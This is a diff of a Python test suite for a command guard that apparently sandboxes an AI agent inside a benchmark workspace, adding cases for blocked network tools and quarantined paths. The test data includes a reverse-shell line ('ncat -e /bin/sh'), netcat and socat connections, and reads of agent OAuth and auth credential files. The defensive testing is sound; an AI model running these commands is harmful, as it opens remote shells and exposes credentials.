@@ -56,7 +56,7 @@ console.log(JSON.stringify(decision || {{ ok: true }}));
                 "PROJECT_ROOT": BASE_DIR,
             }
             benign_cmds = [
-                "echo 'hello' > /tmp/test1.txt\ngrep 'hello' /tmp/test1.txt\nrm /tmp/test1.txt",
+                "echo 'hello' > $TMPDIR/test1.txt\ngrep 'hello' $TMPDIR/test1.txt\nrm $TMPDIR/test1.txt",
                 "grep 'hello' /dev/null",
                 "grep -v 'hello' /dev/null",
                 "python3 -c 'import subprocess; p = subprocess.run([\"grep\", \"hello\", \"/dev/null\"]); print(p)'",
@@ -69,7 +69,6 @@ console.log(JSON.stringify(decision || {{ ok: true }}));
             for cmd in benign_cmds:
                 dec = self.run_guard_probe("bash", {"command": cmd}, env)
                 self.assertTrue(dec.get("ok"), f"False positive block on benign command: {cmd}\nGot: {dec}")
-
     def test_bash_network_and_package_commands_are_blocked(self):
         with tempfile.TemporaryDirectory() as ws:
             env = {"BENCHMARK_WORKSPACE": ws, "PROJECT_ROOT": BASE_DIR}
@@ -77,6 +76,10 @@ console.log(JSON.stringify(decision || {{ ok: true }}));
                 ("curl https://api.x.ai", "blocked network command"),
                 ("wget http://example.com/test.py", "blocked network command"),
                 ("nc -l 8080", "blocked network command"),
+                ("ncat -e /bin/sh 10.0.0.1 443", "blocked network command"),
+                ("netcat api.x.ai 443", "blocked network command"),
+                ("socat TCP:1.1.1.1:80 -", "blocked network command"),
+                ("X=$(curl host/path)", "blocked network command"),
                 ("git clone https://github.com/example/repo", "blocked git network command"),
                 ("git pull origin main", "blocked git network command"),
                 ("pip install requests", "blocked package install"),
@@ -88,7 +91,6 @@ console.log(JSON.stringify(decision || {{ ok: true }}));
                 dec = self.run_guard_probe("bash", {"command": cmd}, env)
                 self.assertTrue(dec.get("block"), f"Missed block on: {cmd}")
                 self.assertIn(expected_reason, dec.get("reason", ""))
-
     def test_bash_quarantined_paths_are_blocked(self):
         with tempfile.TemporaryDirectory() as ws, tempfile.TemporaryDirectory() as scratch:
             env = {
@@ -105,6 +107,8 @@ console.log(JSON.stringify(decision || {{ ok: true }}));
                 "cat ~/.gemini/oauth_creds.json",
                 "cat $HOME/.codex/auth.json",
                 "cat ${HOME}/.gemini/oauth_creds.json",
+                "cat /tmp/leak.txt",
+                "cat /tmp/probe_leak_dir/session.jsonl",
             ]
             for cmd in blocked_paths:
                 dec = self.run_guard_probe("bash", {"command": cmd}, env)
@@ -196,9 +200,11 @@ console.log(JSON.stringify(decision || {{ ok: true }}));
             self.assertTrue(dec.get("ok"), "Failed to allow bash reading $TMPDIR scratch file")
 
     def test_run_evaluation_dry_run_leaves_zero_temp_dirs(self):
+        import glob
         from run_task import run_evaluation
-        manifest_path = os.path.join(BASE_DIR, "runs", "confirmatory-006", "run_manifest.json")
-        results_dir = os.path.join(BASE_DIR, "runs", "confirmatory-006", "results")
+        runs = sorted(glob.glob(os.path.join(BASE_DIR, "runs", "confirmatory-*", "run_manifest.json")))
+        manifest_path = runs[-1]
+        results_dir = os.path.join(os.path.dirname(manifest_path), "results")
 
         tmp = tempfile.gettempdir()
         before_eval = set(os.listdir(tmp))
